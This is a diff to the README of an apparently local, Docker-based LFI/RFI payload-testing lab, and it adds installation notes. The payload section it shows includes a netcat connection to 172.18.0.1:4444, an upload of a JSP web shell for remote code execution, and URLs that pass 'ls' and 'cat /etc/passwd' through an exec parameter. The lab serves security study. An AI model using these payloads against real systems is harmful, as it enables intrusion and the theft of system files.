@@ -1,3 +1,12 @@
+# Installation
+
+Install Docker 
+
+## Ubuntu
+
+Check if you have docker-machine and docker-compose also installed. 
+Notice that if not added to docker group, docker has to be run with sudo.
+
 # Payloads
 
 For an in-detail-description of the following payloads go to [https://secf00tprint.github.io/blog/payload-tester/lfirfi/en](https://secf00tprint.github.io/blog/payload-tester/lfirfi/en)
@@ -73,7 +82,7 @@ nc 172.18.0.1 4444
 
 ### LFI
 
-Upload runme.jsp for Remote Code Execution:
+Upload runme.jsp from attacker_server_jsp for Remote Code Execution:
 
 - [http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=ls](http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=ls)
 - [http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=cat%20/etc/passwd](http://127.0.0.1:8881/webapp/?help=runme.jsp?exec=cat%20/etc/passwd)
